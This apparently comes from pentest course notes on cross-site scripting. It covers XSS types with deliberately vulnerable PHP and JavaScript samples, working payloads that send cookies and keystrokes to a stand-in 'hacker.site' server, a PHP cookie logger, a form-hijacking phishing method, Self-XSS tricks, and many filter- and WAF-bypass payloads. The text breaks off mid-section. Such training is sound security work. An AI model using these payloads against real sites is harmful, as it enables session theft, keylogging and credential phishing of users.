<h1 id="-cross-site-scripting-"><strong>Cross-Site Scripting</strong></h1>
<p>Initially named &quot;cross-site&quot; scripting, it was shortened with CSS; however, when people started to confuse it with its &quot;homonymous&quot;, Cascading Style Sheets, someone on a mailing list proposed to use the XSS abbreviation. That was all it took, and the name stuck.</p>
<h2 id="-xss-"><strong>XSS</strong></h2>
<p>As a rule, XSS occurs when a browser renders untrusted content in a trusted environment. If the content contains dynamic languages such as HTML, JavaScript and others, the browser may execute the untrusted code.</p>
<p>There is no single standardized classification for XSS, but we can identify two main categories: those that deal with the server-side code and those with the <strong>client-side</strong> (however XSS impacts the client only).</p>
<p>Before analyzing techniques and scenarios involving XSS flaw exploitation, let&#39;s briefly recap the main differences between the four types of XSS flaws.</p>
<h3 id="-reflected-xss-"><strong>Reflected XSS</strong></h3>
<p><strong>Reflected XSS</strong> is probably the most common and well understood form of XSS vulnerabilities. It occurs when untrusted user data is sent to a web application and it is immediately echoed back into the untrusted content. Then, as usual, the browser receives the code from the web server response and renders it.</p>
<h4 id="-welcome-message-"><strong>Welcome Message</strong></h4>
<p>Clearly, this type of vulnerability deals with the server-side code. A simple example of vulnerable PHP code is the following welcome message:</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> $name = $_GET[<span class="hljs-string">'name'</span>]; <span class="hljs-meta">?&gt;</span></span>

Welcome <span class="php"><span class="hljs-meta">&lt;?</span>=$name<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>To exploit this type of XSS, it often requires one to craft links and can involve a certain degree of social engineering.</p>
<blockquote>
<p>[!Note]
In addition to this, it&#39;s handy to know how to obfuscate URLs.</p>
<h3 id="-persistent-xss-"><strong>Persistent XSS</strong></h3>
</blockquote>
<p><strong>Persistent</strong> (or <strong>Stored</strong>) XSS flaws are similar to Reflected XSS; however, rather than the malicious input being directly reflected into the response, it is <em>stored</em> within the web application. Once this occurs, it is then echoed somewhere else within the web application and might be available to all visitors.</p>
<p>Even these types of XSS flaws occur within server-side code, but between the two, this is the most useful for an attacker.</p>
<blockquote>
<p>The reason is simple! With a page persistently affected, we are not bound to trick a user. We just exploit the website and then any visitor that visits will run the malicious code and be affected.</p>
</blockquote>
<p>In this scenario, both databases and file system files are the target data storage mechanisms.</p>
<p>The next example is a dummy logging mechanism for newcomers. In this case only the administrator, &quot;identifiable&quot; with a <strong>GET</strong> parameter <code>auth=1</code>, can read the list.</p>
<h4 id="-newcomers-logging-system-"><strong>Newcomers Logging System</strong></h4>
<pre><code class="lang-php">&lt;?php
<span class="hljs-meta"><span class="hljs-meta-keyword">$file</span> = 'newcomers.log';</span>
<span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'name'</span>]) {
    <span class="hljs-symbol">$</span>current = file_get_contents(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);
    <span class="hljs-symbol">$</span>current .= <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'name'</span>].<span class="hljs-string">"\n"</span>;
    file_put_contents(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>, <span class="hljs-symbol">$</span>current);
}
<span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'admin'</span>] == <span class="hljs-number">1</span>)
    echo file_get_contents(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);
</code></pre>
<h3 id="-dom-xss-"><strong>DOM XSS</strong></h3>
<p>The next one is <strong>DOM XSS</strong> which, simply put, is a form of cross-site scripting that exists only within <strong>client-side code</strong> (typically JavaScript).</p>
<p>Generally speaking, this vulnerability lives within the DOM environment, thus within a page&#39;s client-side script itself and does not reach server-side code. This is the reason why this flaw is also known as <strong>Type-0</strong> or <strong>Local XSS</strong>.</p>
<blockquote>
<p>[!Note]
This is similar to our Reflected XSS example but without interacting with the server-side.</p>
</blockquote>
<p>A web application can echo the welcome message in a different way as you will be able to see in the following sample code on the next slide.</p>
<h4 id="-welcome-message-"><strong>Welcome Message</strong></h4>
<pre><code class="lang-html"> <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'welcome'</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
     <span class="hljs-keyword">var</span> w = <span class="hljs-string">"Welcome "</span>;
     <span class="hljs-keyword">var</span> name =  <span class="hljs-built_in">document</span>.location.hash.substr(
         <span class="hljs-built_in">document</span>.location.hash.search(<span class="hljs-regexp">/#w!/i</span>) + <span class="hljs-number">3</span>,
         <span class="hljs-built_in">document</span>.location.hash.length
     );
     <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'welcome'</span>).innerHTML = w + name;
 </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>The key in exploiting this XSS flaw is that the client-side script code can access the browser&#39;s DOM, thus all the information available in it. Examples of this information are the URL, history, cookies, local storage, etc. Despite this, the DOM is a jungle, and finding this type of XSS is not the easiest of tasks.</p>
<p>Technically speaking, when we talk about DOM Based XSS there are two fundamental keywords: <strong>sources</strong> and <strong>sinks</strong>. Back to the previous example, <code>location.hash</code> is the <strong>source</strong> of the untrusted input, while <code>.innerHTML</code> is the <strong>sink</strong> where the input is used.</p>
<blockquote>
<p>In software security the sources are to be considered starting points where untrusted input data is taken by an application. Sinks are meant to be the points in the flow where data depending from sources is used in a potentially dangerous way resulting in loss of Confidentiality, Integrity or Availability (the CIA triad).</p>
<h2 id="-xss-attacks-"><strong>XSS Attacks</strong></h2>
<h3 id="-cookie-gathering-"><strong>Cookie Gathering</strong></h3>
</blockquote>
<p>One of the main techniques used to keep track of user sessions is by using HTTP cookies. Sometimes, these cookies also contain user information such as username, password, and other application related information.</p>
<p>Clearly, these small pieces of data, that are stored within the browser, may give you the key to something special. An example of this is the <strong>user session identifier</strong> of your victim.</p>
<p>So naturally, one of the possible attack vectors used to exploit an XSS flaw is called Cookie Grabbing. Basically, the attacker tries to grab all cookies available within the vulnerable page in order to find something interesting.</p>
<h4 id="-script-injection-"><strong>Script Injection</strong></h4>
<p>Script injection is the first step. Here, we inject the malicious payload that will send the stolen cookies to our controlled server.</p>
<p>To access cookies, the DOM provides the <code>document.cookie</code> property that returns a simple string.</p>
<pre><code class="lang-js"><span class="hljs-keyword">var</span> accessibleCookies = <span class="hljs-built_in">document</span>.cookie;
</code></pre>
<p><strong>accessibleCookies</strong> is a string containing a semicolon separated list of cookies in <code>key=value</code> pairs. The result contains cookies without the <strong>HTTPOnly</strong> attribute. On HTTP connections, only cookies without the <strong>SECURE</strong> attribute set are contained in the result.</p>
<p>To steal cookies, we need to send the <code>document.cookie</code> content to something we can control, using a simple script like:</p>
<pre><code class="lang-js"><span class="hljs-keyword">new</span> Image().src = <span class="hljs-string">"http://hacker.site/recieve.php?cookie="</span> + <span class="hljs-built_in">escape</span>(<span class="hljs-built_in">document</span>.cookie);
</code></pre>
<p>Using the <strong>Image</strong> object, we perform a GET request to our managed server (<code>recieve.php</code>), sending the stolen cookies within the <code>cookie</code> parameter.</p>
<p>We have several options here because we can use different HTML DOM objects, properties and events. This depends on the scenario we are facing and thus where the injection point is and what we can inject!</p>
<p>Let’s look at a few different scenarios.</p>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- Script Variable --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript"> <span class="hljs-keyword">var</span> a = <span class="hljs-string">"INJECTION POINT"</span>; </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-&gt;    ;new Image().src = "http://hacker.site/recieve.php?cookie=" + escape(document.cookie);//"
</code></pre>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- Attribute --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"INJECTION POINT"</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
-&gt;    x" onmouseover = "http://hacker.site/recieve.php?cookie=" + escape(document.cookie)"
</code></pre>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- HREF --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"victim.site/#INJECTION POINT"</span>&gt;</span>
-&gt;    x" onclick = "http://hacker.site/recieve.php?cookie=" + escape(document.cookie)"
</code></pre>
<h4 id="-cookie-recording-logging-"><strong>Cookie Recording &amp; Logging</strong></h4>
<p><strong>Cookie Recording</strong> and then <strong>Logging</strong> are the next steps. Once the client-side has performed the request to our controlled CGI, it is time to handle the request and manage the parameter sent.</p>
<p>Here, we define which information to collect, how to store it and the action to perform once this valuable information is obtained.</p>
<p>Following the previous examples, let&#39;s suppose we have our PHP script <code>receive.php</code> listening on our <code>hacker.site</code> domain. The first basic example, presented on the next slide, instructs the script to simply store the <code>GET[&#39;cookie&#39;]</code> content in a file.</p>
<pre><code class="lang-php">&lt;?php
    error_reporting(<span class="hljs-number">0</span>); # Turn off all <span class="hljs-keyword">error</span> reporting
    $cookie = $_GET[<span class="hljs-string">'cookie'</span>];
    $file = <span class="hljs-string">'stored_file.txt'</span>;
    $handle = <span class="hljs-keyword">fopen</span>($file, <span class="hljs-string">"a"</span>); # Open the <span class="hljs-keyword">file</span> <span class="hljs-keyword">in</span> append mode
    <span class="hljs-keyword">fwrite</span>($handle, $cookie, <span class="hljs-string">"\n"</span>);
    <span class="hljs-keyword">fclose</span>($handle);

    echo <span class="hljs-string">'&lt;h1&gt;Test Page&lt;/h1&gt;'</span>
</code></pre>
<p>Once we obtain the desired cookie, we can do several operations in addition to logging.</p>
<blockquote>
<p>Some examples are as follows: a request to an API that requires the stolen cookies (impersonation), notify the attacker via email.</p>
<h4 id="-httponly-flag-"><strong>HTTPOnly Flag</strong></h4>
</blockquote>
<p>Everything works nicely until we run into cookies with the HTTPOnly flag set!</p>
<p>Basically, this flag forces the browser to handle the cookie only when transmitting HTTP(s) requests; thus, for client side scripting languages (IE: JavaScript), these cookies are practically invisible!</p>
<h3 id="-defacements-"><strong>Defacements</strong></h3>
<p>Although you will never deface your client&#39;s website, defacement is one of the most visible damages that an XSS flaw may cause. Moreover, together with the simple alert box, it happens to be the best way to explain to your client that XSS flaws should be patched as soon as possible.</p>
<p>Instead of injecting malicious code that runs behind the scenes and performs evil operations, (cookie stealing…) with this attack method the malicious intent is to give a precise message or misleading information to users of the attacked application.</p>
<p>We may categorize XSS Defacements into two types: <strong>Non-persistent</strong> or <strong>Virtual</strong> and <strong>Persistent</strong>.</p>
<h4 id="-virtual-defacement-"><strong>Virtual Defacement</strong></h4>
<p>If we exploit an XSS flaw that does not modify the content hosted on the target web application, then we are doing a <strong>Virtual Defacement</strong>. Typically, this is what happens when abusing <strong>Reflected XSS</strong> flaws.</p>
<h4 id="-persistent-defacement-"><strong>Persistent Defacement</strong></h4>
<p>A more severe form is when the defacement becomes <strong>persistent</strong>. In this case, the attacked page is modified permanently and, despite the <em>Virtual Defacement</em> type here, the attacker does not need to fool users into visiting a crafted URL.</p>
<p>Other than benign intentions, this kind of attack could be a good vector for malicious users to conduct sophisticated attacks.</p>
<blockquote>
<p>For example, attacking a newspaper website they can manipulate the masses points of view by spreading fake news!</p>
<h3 id="-phishing-"><strong>Phishing</strong></h3>
</blockquote>
<p>Despite server and client exploitation methodologies, often times <strong>humans</strong>, the weakest link in the information security chain, may help us do the &quot;dirty job&quot;.</p>
<p>In this sub-chapter, we are going to analyze some techniques to conduct a phishing attack over an XSS flaw.</p>
<p>The &quot;theory of phishing&quot; requires some fundamental steps to be followed in order to successfully conduct a phishing attack. One of the first is to create a <strong>fake website</strong> that will contain the malicious code the attacker wants to execute. Then the ways to divulge the links are endless.</p>
<p>To clone a website, there are few options we can embrace. This includes building the website from scratch to cloning an existing one or displaying a simple error page. If our targeted website is affected by an XSS flaw, however, who really cares to do all of this? We can modify the website to behave just like the phishing site.</p>
<p>Assuming we have found an XSS flaw in a website and we want to steal the information that is submitted in a form, how do we accomplish this? A basic way to perform XSS Phishing is to alter the action attribute of the <code>&lt;FORM&gt;</code> tag in order to hijack the submitted form input.</p>
<p>Once the website has been cloned, you should consider where you will host the phishing site. Skipping the &quot;logistics part&quot; (virtual hosting, register, etc…), an interesting point to analyze is what domain name to use.</p>
<p>The more the domain name is similar to the victim&#39;s domain name the better. The simplest way to generate an alike domain name is introducing <strong>typos</strong> and playing with <strong>characters variations</strong>. A simple example is the following:</p>
<pre><code><span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.google</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">wwwgoogle</span><span class="hljs-selector-class">.com</span>
</code></pre><h3 id="-keylogging-"><strong>Keylogging</strong></h3>
<p>Sometimes it’s very helpful to know what our victim is typing during their activity on a targeted website. For example, we may need to read their conversations, steal passwords or credit cards, or their personal information. In these situations we may need a <strong>keylogger</strong>.</p>
<p>What a keylogger does is log keys hit on the victim keyboard. The approach here is the same as with cookie grabbing. We need client-side code that captures the keystrokes and server-side code that stores the keys sent.</p>
<p>There are numerous considerations when writing a keylogger. For example, we need to establish where, when and how to send the keystrokes.</p>
<p>Next, we’re going to see a simple client-side example. For server-side, the procedure is the same as with the Cookie Grabber.</p>
<pre><code class="lang-js"><span class="hljs-keyword">var</span> keys = <span class="hljs-string">""</span>;
<span class="hljs-built_in">document</span>.onkeypress = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>{
    <span class="hljs-keyword">var</span> <span class="hljs-keyword">get</span> = <span class="hljs-built_in">window</span>.event ? event : e;
    <span class="hljs-keyword">var</span> key = <span class="hljs-keyword">get</span>.keyCode ? <span class="hljs-keyword">get</span>.keyCode : <span class="hljs-keyword">get</span>.charCode;
    key = <span class="hljs-built_in">String</span>.fromCharCode(key); keys += key;
}
<span class="hljs-built_in">window</span>.setInterval(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
    <span class="hljs-keyword">if</span>(keys !== <span class="hljs-string">""</span>){
        <span class="hljs-keyword">var</span> path = <span class="hljs-built_in">encodeURI</span>(<span class="hljs-string">"http://hacker.site/keylogger?keys="</span> + keys);
        <span class="hljs-keyword">new</span> Image().src = path; keys = <span class="hljs-string">""</span>;
    }
}, <span class="hljs-number">1000</span>); <span class="hljs-comment">// WHEN &gt; sends the key strokes every second</span>
</code></pre>
<h3 id="-self-xss-"><strong>Self-XSS</strong></h3>
<p>There is a popular attack that mixes <strong>XSS</strong> and <strong>Social Engineering</strong> in a single name <strong>Self-XSS attack</strong>. In this attack, the goal is to trick victims into pasting malicious code into a browser URL bar or console.</p>
<p>This is one of the most popular Social Engineering attack vectors. It is often used by scammers for tricking users into doing something. Its peak of infamy was in the 2011 against Facebook with a porn and violence spam attack .</p>
<p>To mitigate this attack vector, the main browser vendors implemented several security measures to avoid the execution of Self-XSS payloads.</p>
<p>In your browser&#39;s (URL bar), if you paste: <code>javascript:alert(&#39;Self-XSS&#39;)</code>, the browser will strip any leading <code>javascript:</code> from the pasted text.</p>
<pre><code><span class="hljs-string">javascript:</span>alert(<span class="hljs-string">'Self-XSS'</span>)            &gt; alert(<span class="hljs-string">'Self-XSS'</span>) <span class="hljs-string">javascript:</span><span class="hljs-string">javascript:</span>alert(<span class="hljs-string">'Self-XSS'</span>) &gt; alert(<span class="hljs-string">'Self-XSS'</span>)
</code></pre><p><strong>javascript</strong> is not the only scheme to consider! What about the <strong>data</strong> scheme?</p>
<blockquote>
<p>[!Note]
Since the leading javascript: strings are stripped, a simple bypass is to copy the <code>javascript:alert(&#39;Self-XSS&#39;)</code> and then before pasting it in the omnibox, type the <strong>j</strong> character.
Even drag and drop works.</p>
<p>A new URL scheme, &quot;data&quot;, is defined. It allows inclusion of small data items as &quot;immediate&quot; data, as if it had been included externally.</p>
</blockquote>
<p>The following is valid with all previous techniques (copy’n’paste, drag’n’drop,…):</p>
<pre><code>data:text/html,<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'Self-XSS'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre><p>The <strong>data</strong> URI scheme supports the <strong>base64</strong> encoding. This is the previous example but encoded:</p>
<pre><code>data:text/html;base<span class="hljs-number">64</span>,PH<span class="hljs-symbol">NjcmlwdD5</span>hbGVydCg<span class="hljs-symbol">nU2</span><span class="hljs-attr">VsZi1</span>YU<span class="hljs-number">1</span>M<span class="hljs-symbol">nKTwvc2</span><span class="hljs-symbol">NyaXB0</span>Pg==
</code></pre><hr>
<h1 id="-xss-filter-evasion-and-waf-bypassing-"><strong>XSS Filter Evasion and WAF Bypassing</strong></h1>
<p>Over the years, many security researchers have developed guides and cheat sheets to help security professionals in testing Cross-Site Scripting flaws.</p>
<p>In this module, we are not going to analyze the vectors one by that are reported in the cheat sheet, but rather detect which of them are possible scenarios we may run into and see how to overcome them.</p>
<p>The most common scenarios you will come across are:</p>
<ol>
<li>The XSS vector is blocked by the application or something else</li>
<li>The XSS vector is sanitized</li>
<li>The XSS vector is filtered or blocked by the browser<h2 id="-bypassing-blacklisting-filters-"><strong>Bypassing Blacklisting Filters</strong></h2>
</li>
</ol>
<p>Due to ease of installation, filters in blacklist mode are the most common. Their goal is to detect specific patterns and prevent malicious behaviors. It is all a matter of <strong>patterns</strong>, the more accurate they are the more often they will prevent attacks.</p>
<h3 id="-injecting-script-code-"><strong>Injecting Script Code</strong></h3>
<p>The <code>&lt;script&gt;</code> tag is the primary method which can be used to execute client-side scripting code such as JavaScript. It was designed for this purpose, and of course, this is the first vector that most filters block.</p>
<p>It may happen that the filters are weak, and do not cover all the possible cases, making them bypassable. The following examples are just few bypasses for weak rules.</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">ScRiPt</span>&gt;</span><span class="undefined">alert(1);</span><span class="hljs-tag">&lt;/<span class="hljs-name">ScRiPt</span>&gt;</span> 
<span class="hljs-comment">&lt;!-- Upper &amp; Lower-case characters --&gt;</span>
</code></pre>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">ScRiPt</span>&gt;</span><span class="javascript">alert(<span class="hljs-number">1</span>);
<span class="xml"><span class="hljs-comment">&lt;!-- Upper &amp; Lower-case characters, without closing tag --&gt;</span></span></span>
</code></pre>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>/<span class="hljs-attr">random</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-comment">&lt;!-- Random string after the tag name --&gt;</span>
</code></pre>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>
&gt;</span><span class="undefined">alert(1);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-comment">&lt;!-- Newline after the tag name --&gt;</span>
</code></pre>
<pre><code class="lang-html"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">scr</span>&lt;<span class="hljs-attr">script</span>&gt;</span>ipt&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scr</span>&lt;<span class="hljs-attr">script</span>&gt;</span>ipt&gt;
<span class="hljs-comment">&lt;!-- Nested tags --&gt;</span></span>
</code></pre>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">scr\x00ipt</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scr\x00ipt</span>&gt;</span>
<span class="hljs-comment">&lt;!-- NULL byte --&gt;</span>
</code></pre>
<p>Clearly, this is not the only way we have to inject script code. There are several alternatives in which it is possible to run our code, such as different HTML tags and related event handlers.</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span>show<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>show<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>send<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">form</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span>send<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"javascript::alert(1)"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>
</code></pre>
<p>Events are the way that HTML DOM adds interactivity between the website and its visitors; this happens simply by executing the client-side code (e.g., JavaScript).</p>
<p>Almost all event handlers identifier start with <strong>on</strong> and are followed by the name of the event. One of the most used is <code>onerror</code>: <code>&lt;img src=x onerror=alert(1)&gt;</code></p>
<p>But, there are many other <a href="http://help.dottoro.com/lhwfcplu.php">events</a>.</p>
<p>Below are some HTML 5 tags examples:</p>
<pre><code class="lang-html"> <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">keygen</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">onstart</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
</code></pre>
<p>From a defensive point of view, the solution is to filter all the events that start with <code>on*</code> in order to block this injection point.</p>
<p>This is a <code>very common</code> regex you might find used widely: <code>(on\w+\s*=)</code></p>
<p>Thanks to a mix of HTML and browsers &quot;dynamisms&quot;, we can easily bypass this first filter:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>//////<span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x;onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">id</span>=`<span class="hljs-attr">x</span>` <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
</code></pre>
<p>So, we have an &quot;upgrade&quot;: <code>(?i)([\s\&quot;&#39;;\/0-9\=]+on\w+\s*=)</code>. But there is still a problem. Some browsers convert the control character to a space, thus the <code>\s</code> meta-character is not enough to cover all possible characters.</p>
<p>Here are some bypasses:</p>
<pre><code class="lang-html">&lt;svg onload%<span class="hljs-number">09</span>=alert(<span class="hljs-number">1</span>)&gt;
&lt;svg %<span class="hljs-number">09</span>onload=alert(<span class="hljs-number">1</span>)&gt;
&lt;svg %<span class="hljs-number">09</span>onload%<span class="hljs-number">20</span>=alert(<span class="hljs-number">1</span>)&gt;
&lt;svg onload%<span class="hljs-number">09</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">3</span>B=alert(<span class="hljs-number">1</span>)&gt;
&lt;svg onload%<span class="hljs-number">0</span>B=alert(<span class="hljs-number">1</span>)&gt;
</code></pre>
<p>Thanks to Masato Kinugawa, we have a first list of control characters allowed between the event name attribute (e.g. <code>onload</code>) and the equal sign (=) character, or just before the event name:</p>
<pre><code>IExplorer = [<span class="hljs-number">0x09</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x3B</span>]
Chrome    = [<span class="hljs-number">0x09</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x3B</span>]
Safari    = [<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x3B</span>]
FireFox   = [<span class="hljs-number">0x09</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x3B</span>]
Opera     = [<span class="hljs-number">0x09</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x3B</span>]
Android   = [<span class="hljs-number">0x09</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x3B</span>]
</code></pre><p>To date, a valid regex rule should be the following:</p>
<pre><code>(?i)([<span class="hljs-symbol">\s</span><span class="hljs-symbol">\"</span>'`;<span class="hljs-symbol">\/</span>0-9<span class="hljs-symbol">\=</span><span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\0</span>x0D<span class="hljs-symbol">\x</span>3B<span class="hljs-symbol">\x</span>2C <span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>3B]+on<span class="hljs-symbol">\w</span>+[<span class="hljs-symbol">\s</span><span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\0</span>x0D<span class="hljs-symbol">\x</span>3B<span class="hljs-symbol">\x</span>2C<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>3 B]*?=)
</code></pre><h3 id="-keyword-based-filters-"><strong>Keyword Based Filters</strong></h3>
<p>Other obstacles that a signature-based filter may introduce are focused on preventing the executing of scripting code by blocking the use of certain keywords, for example: <code>alert</code>, <code>javascript</code>, <code>eval</code>, etc...</p>
<h4 id="-character-escaping-"><strong>Character Escaping</strong></h4>
<p>JavaScript allows various character escape types that provide us the ability to execute the code instead of being interpreted as literal form.</p>
<p>For the following examples, let’s suppose we need to bypass a filter that blocks the <code>alert</code> keyword. We are ignoring, for a second, that there are other alternatives (see: prompt, confirm, etc.).</p>
<h5 id="-unicode-"><strong>Unicode</strong></h5>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>Here we see Unicode escaping without using native functions:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">\u0061lert(1)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">\u0061\u006C\u0065\u0072\u0074(1)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>We can also see here, Unicode escaping using native functions. Note, <code>eval</code> is just one of many:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">"\u0061lert(1)"</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">"\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029"</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h5 id="-decimal-octal-hexadecimal-"><strong>Decimal, Octal, Hexadecimal</strong></h5>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert(1)"</span>/&gt;</span>
</code></pre>
<p>If the filtered vector is within a string, in addition to Unicode, there are multiple escapes we may adopt:</p>
